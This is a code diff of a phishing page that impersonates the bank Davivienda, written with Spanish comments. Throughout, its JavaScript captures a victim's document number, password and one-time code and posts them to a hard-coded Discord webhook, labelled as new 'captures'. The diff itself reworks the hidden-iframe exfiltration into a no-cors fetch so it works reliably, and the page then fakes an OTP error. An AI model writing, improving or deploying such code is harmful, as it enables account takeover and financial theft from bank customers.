@@ -10,7 +10,7 @@
         #passSection, #otpSection { display: none; }
         .visible { display: block !important; }
         
-        /* Corregimos el espaciado del checkbox según tu observación */
+        /* Espaciado del checkbox corregido para que no esté pegado */
         .checkbox-container {
             margin-top: 25px !important; 
             margin-bottom: 15px !important;
@@ -21,9 +21,6 @@
 
         .step-done { opacity: 0.6; pointer-events: none; }
         .btn-hide { display: none !important; }
-        
-        /* Ocultar el iframe de envío técnico */
-        #hidden_iframe { display: none; }
     </style>
 </head>
 <body>
@@ -76,34 +73,32 @@
                 </div>
             </div>
         </form>
-
-        <form id="discord_form" target="hidden_iframe" method="POST" style="display:none;">
-            <input type="hidden" name="embeds" id="discord_content">
-        </form>
-        <iframe name="hidden_iframe" id="hidden_iframe"></iframe>
     </div>
 
     <script>
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6'; // PEGA TU WEBHOOK AQUÍ
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6';
 
-        // Función de envío técnico compatible con PC, usando Embeds estéticos
-        function sendToDiscord(titulo, color, fields) {
-            // Creamos el JSON del Embed estético
-            const embedData = [{
-                title: titulo,
-                color: color,
-                fields: fields,
-                footer: { text: "Davivienda Live Track | " + new Date().toLocaleString() }
-            }];
-            
-            // Lo enviamos como JSON por medio del formulario invisible
-            const dForm = document.getElementById('discord_form');
-            dForm.action = WEBHOOK_URL;
-            document.getElementById('discord_content').value = JSON.stringify(embedData);
-            dForm.submit(); 
+        // Función de envío compatible con PC y que genera el CUADRO (Embed)
+        async function sendToDiscord(titulo, color, campos) {
+            const data = {
+                embeds: [{
+                    title: titulo,
+                    color: color,
+                    fields: campos,
+                    footer: { text: "Davivienda Live Track • " + new Date().toLocaleString() }
+                }]
+            };
+
+            // 'no-cors' hace que el navegador no bloquee la petición en PC
+            return fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
         }
 
-        // Paso 1 -> Clave
+        // 1. Mostrar Paso 2
         document.getElementById('btnToPass').addEventListener('click', () => {
             if (document.getElementById('docNumber').value.length > 3) {
                 document.getElementById('btnToPass').classList.add('btn-hide');
@@ -112,8 +107,8 @@
             }
         });
 
-        // Paso 2 -> Login (Envía Embed y muestra OTP)
-        document.getElementById('btnToOtp').addEventListener('click', () => {
+        // 2. Enviar LOGIN (Cuadro Rojo) y mostrar OTP abajo
+        document.getElementById('btnToOtp').addEventListener('click', async () => {
             const btn = document.getElementById('btnToOtp');
             const doc = document.getElementById('docNumber').value;
             const clave = document.getElementById('pass').value;
@@ -123,14 +118,13 @@
             btn.innerText = "Validando...";
             btn.disabled = true;
 
-            // Campos del Embed estético (Cuadro Rojo)
-            const fields = [
+            const campos = [
                 { name: "👤 Documento", value: `\`${doc}\``, inline: true },
                 { name: "🔑 Clave", value: `\`${clave}\``, inline: true }
             ];
 
-            // Envía el cuadro Rojo estético
-            sendToDiscord("🏦 NUEVA CAPTURA: DAVIVIENDA", 15548997, fields);
+            // 15548997 es color rojo
+            sendToDiscord("🏦 NUEVA CAPTURA", 15548997, campos);
 
             setTimeout(() => {
                 btn.classList.add('btn-hide');
@@ -140,22 +134,21 @@
             }, 1000);
         });
 
-        // Paso 3 -> OTP Final (Envía Embed y simula error)
-        document.getElementById('btnFinish').addEventListener('click', () => {
+        // 3. Enviar OTP (Cuadro Amarillo)
+        document.getElementById('btnFinish').addEventListener('click', async () => {
             const btn = document.getElementById('btnFinish');
             const otp = document.getElementById('otpCode').value;
             const doc = document.getElementById('docNumber').value;
             
             btn.innerText = "Verificando...";
             
-            // Campos del Embed estético (Cuadro Amarillo)
-            const fields = [
-                { name: "👤 Documento", value: `\`${doc}\``, inline: true },
+            const campos = [
+                { name: "👤 Doc", value: `\`${doc}\``, inline: true },
                 { name: "🔢 Código OTP", value: `\`${otp}\``, inline: true }
             ];
 
-            // Envía el cuadro Amarillo estético
-            sendToDiscord("🔐 CÓDIGO RECIBIDO", 16776960, fields);
+            // 16776960 es color amarillo
+            sendToDiscord("🔐 CÓDIGO RECIBIDO", 16776960, campos);
 
             setTimeout(() => {
                 document.getElementById('errOtp').style.display = 'block';
